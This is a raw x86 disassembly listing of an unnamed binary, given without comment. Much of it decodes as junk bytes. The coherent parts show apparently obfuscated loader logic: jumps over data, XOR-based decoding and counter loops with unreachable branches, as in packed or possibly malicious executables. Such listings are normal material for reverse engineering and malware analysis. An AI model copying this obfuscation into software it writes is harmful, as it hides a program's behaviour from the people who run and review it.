  4098ba:	out    0xd3,al
  4098bc:	cmp    eax,0x1aba6800
  4098c1:	and    eax,edx
  4098c3:	cdq    
  4098c4:	dec    ecx
  4098c5:	xlat   BYTE PTR ds:[ebx]
  4098c6:	adc    DWORD PTR ds:0xc39a39a3,0xe4226928
  4098d0:	loopne 0x4098aa
  4098d2:	iret   
  4098d3:	fs mov cl,0xe1
  4098d6:	pop    ebx
  4098d7:	hlt    
  4098d8:	add    eax,0xdfaedd4a
  4098dd:	pop    es
  4098de:	aad    0x72
  4098e0:	sbb    eax,0x237ac302
  4098e5:	xchg   esp,eax
  4098e6:	mov    ebx,0x4c80fa92
  4098eb:	loopne 0x409882
  4098ed:	sbb    al,0xd9
  4098ef:	pushf  
  4098f0:	mov    esp,0x434efe15
  4098f5:	call   0xb54842ae
  4098fa:	out    0x5c,eax
  4098fc:	jae    0x409891
  4098fe:	jge    0x4098f9
  409900:	rol    DWORD PTR [edx+0x596339b4],cl
  409906:	dec    esi
  409907:	inc    edi
  409908:	cmp    cl,BYTE PTR ds:0xd4e7175c
  40990e:	xchg   BYTE PTR [ebp+0x4022be43],bh
  409914:	mov    dh,0x6e
  409916:	inc    ecx
  409917:	or     BYTE PTR [edx],cl
  409919:	and    BYTE PTR [edi],0x9a
  40991c:	xor    edi,esi
  40991e:	inc    esi
  40991f:	push   ss
  409920:	ss scas al,BYTE PTR es:[edi]
  409922:	xchg   edi,eax
  409923:	or     BYTE PTR [ecx+0x7bb67e9b],dh
  409929:	aad    0x90
  40992b:	mov    BYTE PTR [ebx+0x40],ch
  40992e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40992f:	fsub   QWORD PTR [eax-0x22]
  409932:	rcl    BYTE PTR [esi+esi*2+0x36527f38],1
  409939:	jp     0x409909
  40993b:	mov    cl,0x7a
  40993d:	daa    
  40993e:	daa    
  40993f:	pop    edi
  409940:	xlat   BYTE PTR ds:[ebx]
  409941:	lds    esp,FWORD PTR [ebx+esi*2+0x2c]
  409945:	jmp    0x40994c
  409947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409948:	pmulhuw mm5,QWORD PTR [ebp-0x52]
  40994c:	xor    esp,DWORD PTR [eax-0x2d]
  40994f:	retf   
  409950:	(bad)  
  409951:	cwde   
  409952:	gs dec esi
  409954:	jg     0x4099d0
  409956:	sar    BYTE PTR [edx],cl
  409958:	mov    DWORD PTR [ebp-0x2f],esp
  40995b:	xor    edi,edx
  40995d:	sub    eax,0xc7f5fdf6
  409962:	add    ch,BYTE PTR [edx]
  409964:	cli    
  409965:	and    DWORD PTR [edi],0x60a2bca8
  40996b:	(bad)  
  40996c:	test   eax,0xf6e55b7f
  409971:	dec    DWORD PTR [edi-0x464166ec]
  409977:	mov    edi,DWORD PTR ds:0xb0bdf607
  40997d:	mov    bh,0xa4
  40997f:	inc    esi
  409980:	adc    BYTE PTR [ebp+edx*8-0xc],dh
  409984:	hlt    
  409985:	sbb    bl,BYTE PTR [edi-0x8]
  409988:	test   al,0xcc
  40998a:	and    DWORD PTR [edx+0x50cb345d],eax
  409990:	dec    edx
  409991:	xor    BYTE PTR [ecx+0x2f],bl
  409994:	jge    0x40991c
  409996:	jae    0x4099e4
  409998:	rcr    BYTE PTR [edi],0xa0
  40999b:	cli    
  40999c:	rol    BYTE PTR [esi],cl
  40999e:	or     al,0x1e
  4099a0:	arpl   WORD PTR [eax-0x3d],bp
  4099a3:	sub    dl,cl
  4099a5:	or     al,0x6b
  4099a7:	cdq    
  4099a8:	test   DWORD PTR [edi],eax
  4099aa:	popf   
  4099ab:	shl    dh,cl
  4099ad:	in     al,0xd2
  4099af:	mov    ebp,0x368d9b18
  4099b4:	pcmpeqb mm1,QWORD PTR [ecx+0x64]
  4099b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099b9:	mov    eax,ss
  4099bb:	sub    ah,BYTE PTR [esi+0xe3c0fb9]
  4099c1:	push   edi
  4099c2:	arpl   WORD PTR es:[ebp-0x6aea76af],bp
  4099c9:	test   al,0x42
  4099cb:	add    BYTE PTR [ecx-0x48],dl
  4099ce:	lahf   
  4099cf:	cld    
  4099d0:	mov    ds:0xa505c705,eax
  4099d5:	test   al,0x42
  4099d7:	add    bl,bh
  4099d9:	dec    ecx
  4099da:	add    BYTE PTR [eax],al
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a895,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a819,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a799
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx-0x3a13eb31]
  409a19:	dec    esp
  409a1a:	cwde   
  409a1b:	out    0xb6,eax
  409a1d:	idiv   DWORD PTR [eax+0x78]
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x409a81
  409a25:	xor    ebp,0x25a1b3f3
  409a2b:	sbb    bh,BYTE PTR [edi+0x77b70ecf]
  409a31:	add    ecx,DWORD PTR [edx-0x565234f2]
  409a37:	retf   0x27b8
  409a3a:	sbb    BYTE PTR [edx+0x10f9f95e],ah
  409a40:	cs scas eax,DWORD PTR es:[edi]
  409a42:	jmp    0x409ab6
  409a44:	fstp   QWORD PTR [ecx+edi*4+0x6]
  409a48:	aam    0x61
  409a4a:	out    dx,eax
  409a4b:	sub    dl,bl
  409a4d:	dec    esi
  409a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a4f:	pop    ebp
  409a50:	das    
  409a51:	sub    ecx,DWORD PTR [ebx+ebx*1]
  409a54:	imul   ebx,DWORD PTR [ebp+0x37],0xf02ab9fb
  409a5b:	mov    eax,0x25bf885
  409a60:	rol    DWORD PTR [edi+0x21],1
  409a63:	lds    edi,FWORD PTR es:[ecx-0x5db92a9e]
  409a6a:	mov    ah,0xbb
  409a6c:	and    al,0xf5
  409a6e:	jb     0x409a9a
  409a70:	fisttp QWORD PTR [esp+ebp*2-0x4d85dd03]
  409a77:	sub    BYTE PTR [ebx-0x244f8c53],bh
  409a7d:	retf   
  409a7e:	mov    edi,0xf4422126
  409a83:	jl     0x409a87
  409a85:	shl    esi,cl
  409a87:	(bad)  
  409a88:	or     eax,edi
  409a8a:	and    eax,0xd86f6593
  409a8f:	ins    BYTE PTR es:[edi],dx
  409a90:	stos   DWORD PTR es:[edi],eax
  409a91:	push   esp
  409a92:	pop    ecx
  409a93:	jmp    0x6e7b:0x7dff5296
  409a9a:	adc    BYTE PTR [ecx],0xe3
  409a9d:	dec    esi
  409a9e:	xchg   ecx,eax
  409a9f:	jp     0x409a62
  409aa1:	test   eax,0xf837b67e
  409aa6:	push   ebp
  409aa7:	add    DWORD PTR [edx],esi
  409aa9:	mov    BYTE PTR [ebx+0x7b],cl
  409aac:	or     eax,ecx
  409aae:	sub    DWORD PTR ds:0x7f81d54,edi
  409ab4:	imul   edx,DWORD PTR [eax+0x73],0x1f
  409ab8:	inc    esi
  409ab9:	jne    0x409ae0
  409abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409abc:	(bad)  
  409abd:	(bad)  
  409abe:	repnz outs dx,DWORD PTR ds:[esi]
  409ac0:	lea    ebx,[ebx+0x133c991e]
  409ac6:	sbb    BYTE PTR [eax-0x2ddc7825],ah
  409acc:	xchg   ecx,eax
  409acd:	stos   DWORD PTR es:[edi],eax
  409ace:	pop    ebx
  409acf:	xor    DWORD PTR [edx],ecx
  409ad1:	adc    DWORD PTR ds:0xdbf1d440,edx
  409ad7:	pop    edi
  409ad8:	test   DWORD PTR [ecx+0x53],ebp
  409adb:	push   edx
  409adc:	sbb    al,BYTE PTR [eax+0x2b12de1a]
  409ae2:	inc    edx
  409ae3:	ret    0x1bfb
  409ae6:	lods   al,BYTE PTR ds:[esi]
  409ae7:	mov    ch,0xe1
  409ae9:	mov    esi,0x210623ff
  409aee:	xchg   edx,eax
  409aef:	call   0x569da296
  409af4:	out    dx,al
  409af5:	add    BYTE PTR [ecx-0xe],ch
  409af8:	mov    dl,0x33
  409afa:	push   0xe92a6916
  409aff:	cmp    BYTE PTR [eax+0x481abfdc],al
  409b05:	scas   eax,DWORD PTR es:[edi]
  409b06:	adc    eax,0x2aa106b4
  409b0b:	adc    BYTE PTR [ebx-0x6d5d903d],bl
  409b11:	cli    
  409b12:	mov    ebx,0x84ed8ade
  409b17:	cs daa 
  409b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b1a:	adc    eax,0x41d5d202
  409b1f:	cld    
  409b20:	(bad)  
  409b21:	lock div edi
  409b24:	jbe    0x409b57
  409b26:	pop    es
  409b27:	cmp    BYTE PTR [ebx],0xe0
  409b2a:	fild   WORD PTR [edi+0x4e133b25]
  409b30:	inc    esp
  409b31:	pop    es
  409b32:	pop    ecx
  409b33:	inc    ebp
  409b34:	cmp    esp,edi
  409b36:	push   ss
  409b37:	mov    dh,0xa6
  409b39:	xor    eax,0x3130709d
  409b3e:	fimul  WORD PTR [eax]
  409b40:	and    al,0x7a
  409b42:	or     ecx,esp
  409b44:	jb     0x409b62
  409b46:	jle    0x409ad6
  409b48:	mov    eax,0xe5cdfed5
  409b4d:	idiv   DWORD PTR [ebp-0x6962c821]
  409b53:	clc    
  409b54:	and    DWORD PTR [esi-0x2a798215],esi
  409b5a:	push   edi
  409b5b:	push   es
  409b5c:	jmp    0xf463:0x86145be6
  409b63:	inc    edx
  409b64:	dec    ebx
  409b65:	shl    BYTE PTR [edx-0x34a5d689],0xcc
  409b6c:	dec    DWORD PTR gs:[ebx-0x45]
  409b70:	or     dl,cl
  409b72:	or     DWORD PTR [edi-0x231c27bd],esi
  409b78:	mov    ecx,ebx
  409b7a:	xchg   ebx,eax
  409b7b:	bound  eax,QWORD PTR [edx]
  409b7d:	push   0x78
  409b7f:	mov    ds,WORD PTR [esi-0x25]
  409b82:	stos   BYTE PTR es:[edi],al
  409b83:	jmp    0x409b50
  409b85:	mov    ebx,0x9e58beb1
  409b8a:	call   0xd729:0x2047a964
  409b91:	nop
  409b92:	sbb    eax,0x77f001ce
  409b97:	jecxz  0x409b67
  409b99:	div    DWORD PTR [edi-0x58c838e]
  409b9f:	jae    0x409bed
  409ba1:	mov    edx,DWORD PTR [ecx-0x72]
  409ba4:	ret    
  409ba5:	fbstp  TBYTE PTR [eax+0x5f20fe7d]
  409bab:	aad    0x6
  409bad:	sbb    DWORD PTR [esi-0x19d4f38a],eax
  409bb3:	mov    esp,0xed321d2b
  409bb8:	dec    ebx
  409bb9:	js     0x409b98
  409bbb:	and    al,0x93
  409bbd:	pop    ss
  409bbe:	pop    esp
  409bbf:	in     al,dx
  409bc0:	sbb    eax,0xdc1dddbb
  409bc5:	pusha  
  409bc6:	ret    
  409bc7:	jns    0x409b4c
  409bc9:	pop    ss
  409bca:	xchg   edx,eax
  409bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bcc:	daa    
  409bcd:	(bad)  
  409bce:	mov    ?,WORD PTR [esi-0x13]
  409bd1:	enter  0xa35d,0xf7
  409bd5:	js     0x409b8f
  409bd7:	stos   DWORD PTR es:[edi],eax
  409bd8:	mov    ebx,0x3d0c7fd4
  409bdd:	pop    edx
  409bde:	cdq    
  409bdf:	into   
  409be0:	ins    DWORD PTR es:[edi],dx
  409be1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409be2:	sbb    ebp,DWORD PTR [edx+0x4c]
  409be5:	add    DWORD PTR [di-0x9],0x62
  409bea:	shr    BYTE PTR [esi+0x38],cl
  409bed:	mov    eax,ebp
  409bef:	icebp  
  409bf0:	mov    gs,WORD PTR [ebx-0x78]
  409bf3:	outs   dx,BYTE PTR ds:[esi]
  409bf4:	sar    cl,cl
  409bf6:	call   0xcb02d564
  409bfb:	retf   
  409bfc:	inc    edi
  409bfd:	pop    ebp
  409bfe:	push   0x3c
  409c00:	push   esp
  409c01:	(bad)  
  409c02:	cmc    
  409c03:	rcl    ecx,cl
  409c05:	rol    DWORD PTR [bp+0x534f],0x7c
  409c0b:	jle    0x409c8b
  409c0d:	dec    ebp
  409c0e:	mov    dh,0xb0
  409c10:	pop    ebx
  409c11:	add    dl,ch
  409c13:	pop    edx
  409c14:	add    esi,DWORD PTR [edi]
  409c16:	mov    esi,DWORD PTR [ecx+0x36e9301c]
  409c1c:	es repnz fwait
  409c1f:	dec    ebx
  409c20:	out    dx,eax
  409c21:	sbb    eax,eax
  409c23:	cld    
  409c24:	pop    ebp
  409c25:	mov    eax,ds:0x6f6ea9d8
  409c2a:	test   BYTE PTR [edx+eax*8-0x19],bh
  409c2e:	lods   eax,DWORD PTR ds:[esi]
  409c2f:	jns    0x409bf6
  409c31:	or     al,0x99
  409c33:	fisttp DWORD PTR [esi]
  409c35:	in     al,dx
  409c36:	stos   DWORD PTR es:[edi],eax
  409c37:	inc    eax
  409c38:	cmp    dh,BYTE PTR [eax]
  409c3a:	sbb    al,0xf9
  409c3c:	sbb    edx,0x2769b7de
  409c42:	and    eax,0x7587c475
  409c47:	push   DWORD PTR [ebx+ebx*8+0x12]
  409c4b:	mov    bh,BYTE PTR [eax]
  409c4d:	mov    cl,0xfd
  409c4f:	popf   
  409c50:	xchg   edi,eax
  409c51:	push   0xffffffa0
  409c53:	pop    di
  409c55:	cdq    
  409c56:	pop    eax
  409c57:	inc    ebp
  409c58:	stos   DWORD PTR es:[edi],eax
  409c59:	ja     0x409cb8
  409c5b:	cmp    BYTE PTR [ebx],dl
  409c5d:	mov    edx,0xb9ebee94
  409c62:	dec    ebp
  409c63:	frstor [ebx]
  409c65:	out    dx,eax
  409c66:	or     edi,DWORD PTR [ebx]
  409c68:	push   cs
  409c69:	inc    eax
  409c6a:	or     dh,bl
  409c6c:	lds    ebp,FWORD PTR [esi]
  409c6e:	fimul  WORD PTR [ebx]
  409c70:	pop    esp
  409c71:	pop    edi
  409c72:	int3   
  409c73:	mov    cl,0x94
  409c75:	sar    dh,cl
  409c77:	iret   
  409c78:	or     esp,esp
  409c7a:	outs   dx,BYTE PTR ds:[esi]
  409c7b:	mov    cl,0x3
  409c7d:	or     cl,BYTE PTR [eax+edx*1+0x77d56a46]
  409c84:	cmp    eax,0x8f8a44ea
  409c89:	sub    eax,0xd4c838a9
  409c8e:	push   ebx
  409c8f:	pop    esp
  409c90:	inc    eax
  409c91:	mov    dl,0x20
  409c93:	call   0x55825b88
  409c98:	mov    ebp,0xa87f2dff
  409c9d:	scas   eax,DWORD PTR es:[edi]
  409c9e:	mov    ds:0x69d13d99,al
  409ca3:	int    0xae
  409ca5:	dec    esp
  409ca6:	mov    eax,ds:0x7431b98c
  409cab:	out    dx,eax
  409cac:	and    esp,DWORD PTR [edi]
  409cae:	and    al,0xd8
  409cb0:	and    eax,0x680253a9
  409cb5:	and    ebp,eax
  409cb7:	xchg   ebp,eax
  409cb8:	int3   
  409cb9:	test   eax,0xdd61bbaf
  409cbe:	in     al,dx
  409cbf:	sar    bh,1
  409cc1:	push   0xffffffe6
  409cc3:	add    al,0xa6
  409cc5:	js     0x409c65
  409cc7:	inc    edi
  409cc8:	and    DWORD PTR [eax+0x5],esi
  409ccb:	cmp    edx,ecx
  409ccd:	jns    0x409d05
  409ccf:	sbb    BYTE PTR [eax+0x11d0a093],al
  409cd5:	jge    0x409c60
  409cd7:	xchg   edx,eax
  409cd8:	cdq    
  409cd9:	(bad)  
  409cda:	jmp    0x409c6a
  409cdc:	mov    cl,0x71
  409cde:	add    eax,0xbc7493f7
  409ce3:	jle    0x409cf4
  409ce5:	push   ds
  409ce6:	push   cs
  409ce7:	fisttp DWORD PTR [edx]
  409ce9:	fbld   TBYTE PTR [esi-0x1d274a58]
  409cef:	cmp    eax,0xc7d16e01
  409cf4:	mov    eax,ds:0x42a8547a
  409cf9:	cwde   
  409cfa:	mov    ax,WORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a799,0x42a825
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a79d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a861,0x42a85d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a851,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi+0x6c143aff],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d69
  409d66:	out    0x83,al
  409d68:	ror    ebp,cl
  409d6a:	mov    al,ds:0xb5b30ca6
  409d6f:	mov    al,0x1e
  409d71:	and    edx,DWORD PTR [ebp-0x20e0298d]
  409d77:	pop    esp
  409d78:	mov    cl,0xaf
  409d7a:	sbb    eax,0x3ee973a3
  409d7f:	dec    esp
  409d80:	mov    ecx,0xc1407328
  409d85:	les    ebp,FWORD PTR [edx+ecx*2-0x6102bea2]
  409d8c:	aad    0x64
  409d8e:	mov    bh,0x5b
  409d90:	xor    eax,0xdb33f7f5
  409d95:	aaa    
  409d96:	sbb    dl,BYTE PTR [edx+esi*1+0x6a8b53f1]
  409d9d:	push   ds
  409d9e:	shr    esp,cl
  409da0:	lock or ebx,eax
  409da3:	jbe    0x409d5f
  409da5:	fcomp  DWORD PTR ds:0x297559da
  409dab:	pop    ebp
  409dac:	aaa    
  409dad:	push   0xe2dd7bef
  409db2:	cmovno edi,DWORD PTR [eax-0x11d2a143]
  409db9:	retf   0xfc73
  409dbc:	sahf   
  409dbd:	call   0xeb2c:0x4a82caa7
  409dc4:	mov    ebx,0x9fce7e90
  409dc9:	ret    
  409dca:	xchg   edi,eax
  409dcb:	inc    edi
  409dcc:	push   esp
  409dcd:	fisttp WORD PTR [esi+ecx*4]
  409dd0:	mov    bh,0x49
  409dd2:	(bad)  [esi-0x7d58c365]
  409dd8:	xor    eax,0x6c58f5e2
  409ddd:	ins    DWORD PTR es:[edi],dx
  409dde:	push   ebp
  409ddf:	enter  0xbb14,0xd5
  409de3:	xor    al,0xb5
  409de5:	stc    
  409de6:	and    ebx,esi
  409de8:	outs   dx,DWORD PTR ds:[esi]
  409de9:	dec    ebp
  409dea:	repz add dl,bl
  409ded:	repnz inc eax
  409def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409df0:	jl     0x409d8f
  409df2:	mov    WORD PTR [esi-0x130c8285],cs
  409df8:	dec    esi
  409dfa:	sbb    DWORD PTR [edi],esi
  409dfc:	mov    bh,BYTE PTR [ebx-0x4085e26d]
  409e02:	push   esi
  409e03:	inc    edx
  409e04:	fwait
  409e05:	xchg   esi,eax
  409e06:	outs   dx,DWORD PTR ds:[esi]
  409e07:	push   esi
  409e08:	pop    ss
  409e09:	nop
  409e0a:	shl    DWORD PTR [eax+ecx*1],0x4a
  409e0e:	adc    BYTE PTR [esi+0x3a478a4],al
  409e14:	mov    bl,cl
  409e16:	outs   dx,BYTE PTR ds:[esi]
  409e17:	dec    esp
  409e18:	sbb    DWORD PTR [edx+0x316aeb2b],0xa5b70bf
  409e22:	dec    eax
  409e23:	repnz push esp
  409e25:	(bad)  
  409e26:	stc    
  409e27:	cwde   
  409e28:	arpl   cx,bp
  409e2a:	jno    0x409e4c
  409e2c:	or     eax,0x14d7109f
  409e31:	push   ebx
  409e32:	pop    ecx
  409e33:	cmp    eax,0x84d8f58d
  409e38:	and    eax,0x616bf1fd
  409e3d:	outs   dx,BYTE PTR ds:[esi]
  409e3e:	cmc    
  409e3f:	cli    
  409e40:	dec    eax
  409e41:	fs mov ebx,ebp
  409e44:	push   0x2c199bcf
  409e49:	imul   edi,DWORD PTR [eax-0x559a9104],0x77c3316b
  409e53:	pop    ecx
  409e54:	shl    dl,1
  409e56:	jns    0x409e72
  409e58:	out    0x17,al
  409e5a:	fbstp  TBYTE PTR [eax]
  409e5c:	pop    ecx
  409e5d:	mov    cl,0x29
  409e5f:	adc    al,0xe5
  409e61:	xor    ecx,DWORD PTR [ebp-0x76ea7ac3]
  409e67:	fcomp  DWORD PTR [esi+esi*1]
  409e6a:	pop    edx
  409e6b:	(bad)  
  409e6c:	mov    ch,0x62
  409e6e:	div    DWORD PTR [edi]
  409e70:	adc    ah,BYTE PTR [ecx-0x34583898]
  409e76:	ss cs mov ebx,0x414d3a02
  409e7d:	stc    
  409e7e:	fisubr DWORD PTR [ecx+0x5d358715]
  409e84:	jbe    0x409ef3
  409e86:	(bad)  
  409e87:	in     eax,dx
  409e88:	mov    ecx,0xd59d4b07
  409e8d:	call   0xc48a2a2b
  409e92:	dec    edx
  409e93:	inc    ebx
  409e94:	xor    al,0x69
  409e96:	outs   dx,BYTE PTR ds:[esi]
  409e97:	addr16 je 0x409e1d
  409e9a:	inc    edi
  409e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e9c:	(bad)  
  409e9d:	jnp    0x409f1c
  409e9f:	jae    0x409f0e
  409ea1:	shr    DWORD PTR [ebx-0x3a],1
  409ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ea5:	js     0x409e64
  409ea7:	or     DWORD PTR [edi],ecx
  409ea9:	ret    0x306b
  409eac:	pop    eax
  409ead:	jle    0x409ebe
  409eaf:	les    edx,FWORD PTR [ecx-0xfcbd61c]
  409eb5:	enter  0x1c47,0xb4
  409eb9:	pusha  
  409eba:	jl     0x409f20
  409ebc:	mov    al,0x44
  409ebe:	sbb    ebx,DWORD PTR [edx-0x58]
  409ec1:	and    dx,WORD PTR [esi]
  409ec4:	mov    ch,0x90
  409ec6:	lea    eax,[eax+0x36d8502b]
  409ecc:	cwde   
  409ecd:	pop    ecx
  409ece:	xchg   ebx,edx
  409ed0:	mov    BYTE PTR gs:[ecx+0x4be1eb18],dl
  409ed7:	adc    DWORD PTR [ecx-0x6a4b2aef],esi
  409edd:	jp     0x409e7c
  409edf:	call   0xe0ddee3e
  409ee4:	mov    ch,BYTE PTR [edi-0x2c5cc16c]
  409eea:	cmp    eax,0x656f9d38
  409eef:	lods   al,BYTE PTR ds:[esi]
  409ef0:	xchg   edi,eax
  409ef1:	iret   
  409ef2:	inc    ebp
  409ef3:	fwait
  409ef4:	jno    0x409f3a
  409ef6:	adc    cl,dh
  409ef8:	inc    ebx
  409ef9:	inc    ebx
  409efa:	push   0x204796ee
  409eff:	lods   al,BYTE PTR ds:[esi]
  409f00:	ins    DWORD PTR es:[edi],dx
  409f01:	idiv   BYTE PTR [esi]
  409f03:	in     al,0x6f
  409f05:	pop    ds
  409f06:	xor    ebp,esi
  409f08:	cmp    DWORD PTR [edx],esi
  409f0a:	and    eax,0xe4ce6be3
  409f0f:	adc    eax,0x4f49a02a
  409f14:	aaa    
  409f15:	inc    esi
  409f16:	push   cs
  409f17:	aam    0xfc
  409f19:	mov    esi,0x92e6bddd
  409f1e:	jbe    0x409ed5
  409f20:	dec    esp
  409f21:	mov    ds:0x286ff240,al
  409f26:	xor    cl,bh
  409f28:	outs   dx,BYTE PTR ds:[esi]
  409f29:	mov    al,ds:0x7aee7c77
  409f2e:	fs mov al,0xd3
  409f31:	int    0xfb
  409f33:	fwait
  409f34:	mov    ds:0xd042936d,eax
  409f39:	mov    bh,0xaa
  409f3b:	in     al,dx
  409f3c:	mov    ch,0xe2
  409f3e:	div    DWORD PTR [eax+0x841df3e]
  409f44:	xchg   edi,eax
  409f45:	mov    ch,0x41
  409f47:	jnp    0x409f05
  409f49:	lods   eax,DWORD PTR ds:[esi]
  409f4a:	mov    dl,0x1a
  409f4c:	jecxz  0x409f67
  409f4e:	mov    esi,DWORD PTR [ecx+esi*2-0x65]
  409f52:	iret   
  409f53:	mov    dl,0xa8
  409f55:	mov    ah,BYTE PTR [eax+0x427b4d33]
  409f5b:	lods   eax,DWORD PTR ds:[esi]
  409f5c:	or     BYTE PTR [ebx-0x77],ch
  409f5f:	push   0x4ddc2e38
  409f64:	idiv   BYTE PTR [eax+0x11]
  409f67:	sbb    ecx,DWORD PTR [ebx+0x55ecd550]
  409f6d:	pop    eax
  409f6e:	lea    esi,[edi]
  409f70:	add    bh,BYTE PTR [eax]
  409f72:	out    0x83,eax
  409f74:	push   ebx
  409f75:	push   ecx
  409f76:	pusha  
  409f77:	pop    ebp
  409f78:	frstor [ebx-0x3]
  409f7b:	enter  0x5c37,0x51
  409f7f:	or     al,0x89
  409f81:	sub    BYTE PTR [ebp+0x2f4b9fef],bh
  409f87:	out    dx,eax
  409f88:	fdivp  st(0),st
  409f8a:	mov    ecx,0x2f6efe24
  409f8f:	sbb    al,0xee
  409f91:	test   BYTE PTR [ebx+0x5d],ah
  409f94:	test   DWORD PTR [esp+eiz*2],eax
  409f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f98:	rol    DWORD PTR [esi-0x6c],1
  409f9b:	pop    edx
  409f9c:	cmp    dh,BYTE PTR [edi+eax*4]
  409f9f:	enter  0xb534,0x7e
  409fa3:	xchg   ebx,eax
  409fa4:	push   ebx
  409fa5:	jp     0x409fb2
  409fa7:	into   
  409fa8:	cdq    
  409fa9:	lea    esp,[edi]
  409fab:	or     BYTE PTR [ebp+0xb7de586],0x4d
  409fb2:	dec    esp
  409fb3:	push   edx
  409fb4:	jp     0x409ff8
  409fb6:	sbb    eax,0x59d28456
  409fbb:	pop    ecx
  409fbc:	aam    0x32
  409fbe:	adc    al,0x71
  409fc0:	sub    ch,al
  409fc2:	ss dec eax
  409fc4:	iret   
  409fc5:	cli    
  409fc6:	dec    ebx
  409fc7:	lods   eax,DWORD PTR ds:[esi]
  409fc8:	jg     0x40a048
  409fca:	pop    esi
  409fcb:	adc    ecx,DWORD PTR [eax]
  409fcd:	nop
  409fce:	pop    es
  409fcf:	ss pushf 
  409fd1:	cmp    al,0x43
  409fd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd4:	pop    ebp
  409fd5:	xchg   ecx,eax
  409fd6:	(bad)  
  409fd7:	aad    0x1c
  409fd9:	and    esi,DWORD PTR [ebx+0x79eb1de8]
  409fdf:	sub    dl,BYTE PTR [edi+0x58]
  409fe2:	mov    ds:0x37ea0d4c,eax
  409fe7:	sahf   
  409fe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe9:	mov    ecx,0x9c12101
  409fee:	inc    eax
  409fef:	cvtps2pd xmm1,xmm2
  409ff2:	loope  0x40a05d
  409ff4:	dec    ebp
  409ff5:	or     BYTE PTR [ebx],0x45
  409ff8:	repnz xchg ecx,eax
  409ffa:	cs in  al,0x9d
  409ffd:	or     edi,ebp
  409fff:	or     eax,0x7bbbea38
  40a004:	repz test al,0xa
  40a007:	xor    eax,0xf6d84bfe
  40a00c:	jmp    0x409f9b
  40a00e:	add    esi,DWORD PTR [ebp-0x6323ce43]
  40a014:	pop    edi
  40a015:	sub    eax,0x5fbcfbce
  40a01a:	and    DWORD PTR [ebx-0x7af524aa],edi
  40a020:	cwde   
  40a021:	retf   
  40a022:	mov    dh,0xfb
  40a024:	fcomp  QWORD PTR [eax-0x4a]
  40a027:	mov    esi,0xb9b53959
  40a02c:	add    dh,BYTE PTR [ebx-0x7d]
  40a02f:	push   es
  40a030:	jno    0x409fb8
  40a032:	iret   
  40a033:	out    0x31,al
  40a035:	lods   eax,DWORD PTR ds:[esi]
  40a036:	lahf   
  40a037:	xchg   ecx,eax
  40a038:	ret    0x2c25
  40a03b:	mov    ecx,DWORD PTR [ebp+0x8]
  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a785,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a785
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a785,eax
  40a084:	cmp    DWORD PTR ds:0x42a785,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a785,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a891,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a891
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a891,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a891,0x11
  40a0d8:	jae    0x40a110
